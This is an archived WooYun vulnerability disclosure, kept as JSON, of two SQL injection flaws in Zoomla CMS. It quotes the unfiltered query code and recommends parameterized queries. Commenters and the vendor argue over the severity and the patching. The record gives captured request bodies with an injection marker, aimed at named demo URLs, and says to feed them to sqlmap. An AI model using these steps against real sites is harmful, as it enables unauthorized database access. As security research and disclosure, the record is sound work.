{"id": 7015, "wybug_id": "wooyun-2013-040878", "wybug_title": "逐浪CMS通用型SQL注入1+2", "wybug_corp": "逐浪CMS", "wybug_author": "wefgod", "wybug_date": "2013-11-19 02:40", "wybug_open_date": "2014-01-03 02:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射", "注射技巧", "代码审计"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-01-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-01-03：\t细节向公众公开  简要描述： 之前因为这套CMS被人叫了一回专注哥了，来提两个逐浪CMS的注入吧 详细说明：  其实这套东西好多注入。注入1：http://demo.zoomla.cn/mis/target/page.aspxTxtKey参数        string selectedValue = this.drType.SelectedValue;        string text = this.TxtKey.Text;        this.dt = this.bll.Sel(string.Concat(new string[]        {            \"ParentID=0 And Inputer='\",            this.buser.GetLogin().UserName,            \"' And type like '%\",            selectedValue,            \"%' And Title like '%\",            text,  //没有过滤直接带入查询，导致漏洞产生            \"%'\"        }), \"ID desc\");前台注册一个用户。先到http://demo.zoomla.cn/mis/target/AddTarget.aspx添加一个名为test123的目标访问下面的链接：http://demo.zoomla.cn/mis/target/page.aspx搜索test123\n\n抓取数据包，把test123修改为test123%’*--__VIEWSTATE=%2FwEPDwULLTEyMzkzMzg1NzcPZBYCAgMPZBYCAgcPFgIeC18hSXRlbUNvdW50AgEWAmYPZBYCZg8VAgExB3Rlc3QxMjNkZG7nnQ6pZXGUWElWkzGHXn71ZHNY&drType=&TxtKey=test123%’*--&Button1=%E6%90%9C%E7%B4%A2连着cookie丢到sqlmap即可：\n\n\n\n   漏洞证明：  注入点2：http://demo.zoomla.cn/mis/addmis.aspxtitle参数protected void Button_Click(object sender, EventArgs e)…DataTable dataTable = this.bll.Sel(\"Title='\" + this.TextTitle.Text.Trim() + \"'\", \"\"); //title参数存在注入的问题。没有过滤…随便输入点信息：\n\n点击确定，然后抓包__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=%2FwEPDwUJMTY5OTMzNTg0ZGSXrsn5RKQ7H7z5jSEJzO1T2S1Tog%3D%3D&TextTitle=aaa&TextStatus=1&TextType=3&TextJoiner=a&StarDate=2013%2F10%2F24+10%3A50%3A01&EndDate=2013%2F10%2F24+10%3A50%3A04&TextContent=&BtnCommit=%E7%A1%AE%E5%AE%9A&ParentID=TextTitle=aaa 存在注入带上COOKIE丢到sqlmap即可\n\n\n\n\n\n   修复方案：  过滤，参数化查询。   版权声明：转载请注明来源 wefgod@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2013-11-20 08:45 厂商回复： 此问题已经处理，待官方新包更新（商业用户包和正式用户已投递更新包。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-24 14:58 |    \t\tMeirLin \t\t\t( 实习白帽子  |\t\t\t        Rank:96 漏洞数:30        | 号借人)\t\t \n  等忽略,    \n     2013-10-24 17:07 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @MeirLin 小漏洞。    \n     2013-10-24 17:09 |    \t\tMeirLin \t\t\t( 实习白帽子  |\t\t\t        Rank:96 漏洞数:30        | 号借人)\t\t \n  @wefgod 求透露之    \n     2013-10-24 17:12 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @MeirLin 怎么那么有兴趣……已经在某处提交过N个了    \n     2013-10-24 22:28 |    \t\t在路上 \t\t\t( 普通白帽子  |\t\t\t        Rank:193 漏洞数:13        | 在学习的路上、在成长的路上...)\t\t \n  有钱吧 呵呵    \n     2013-10-25 01:20 |    \t\t一只猿 \t\t\t( 普通白帽子  |\t\t\t        Rank:463 漏洞数:89        | 硬件与无线通信研究方向)\t\t \n  @在路上 @wefgod 大牛    \n     2013-10-25 09:09 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @在路上 没有钱。    \n     2013-10-25 09:09 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @一只猿 哪里大牛，打酱油    \n     2013-10-25 19:53 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @一只猿 @在路上  悲剧，厂商说这个肯定是老漏洞，早修复了。为什么我手上有5个没有提交过的他也知道？恶搞    \n     2013-10-25 23:57 |    \t\t在路上 \t\t\t( 普通白帽子  |\t\t\t        Rank:193 漏洞数:13        | 在学习的路上、在成长的路上...)\t\t \n  @一只猿 @wefgod 咱们把群移到乌云上来吧 呵呵    \n     2013-10-30 14:41 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @@逐浪CMS     \n     2013-11-01 17:44 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @疯狗  狗哥，逐浪已经来了，为啥不关联过去？    \n     2013-11-04 11:19 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @wefgod 应该是注册前提交的，没自动关联过去，现在已经处理了    \n     2013-11-04 14:34 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @疯狗 狗哥，3个呢，就一个关联过去了……    \n     2013-11-04 16:55 |    \t\t逐浪CMS(乌云厂商)\t\t \n  @wefgod 在逐浪CMS的版发布中，分开放版、商业版和OEM版，开放版未有更新，因为MIS功能本身是内测的，而商业版确实已经更新并处理了，只待新版发布，亲。    \n     2013-11-04 19:39 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @逐浪CMS 看厂商这话，我似乎看到了两点：1.开放版确实存在该漏洞，但是为了不让别人觉得我们安全性做的不好，忽略掉让人觉得不存在；2.给钱好办事，商业版已经处理好了，用开放版的用户就自己慢慢等着吧。     其实漏洞存在就是存在，更新是必须的，但是不是说你忽略就表明这个漏洞不存在过，这也看出厂商本身对安全的看法了，我就不多发表评论了，有人爱搞你们的用户那也不关我的事情我只是来告诉问题，随你们怎么处理了    \n     2013-11-05 16:12 |    \t\t霍大然 \t\t\t( 普通白帽子  |\t\t\t        Rank:1136 漏洞数:178        | W币花完了，刷分还是不刷？)\t\t \n  只待新版发布说明没有解决，开放版有问题难道就不算有问题？    \n     2013-11-05 18:52 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @霍大然 哈哈，大牛说的好。厂商就这样的态度    \n     2013-11-20 10:35 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @一只猿 @在路上  厂商居然给了1rank！    \n     2014-02-02 14:34 |    \t\t一只猿 \t\t\t( 普通白帽子  |\t\t\t        Rank:463 漏洞数:89        | 硬件与无线通信研究方向)\t\t \n  哈哈哈，1rank  好多    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}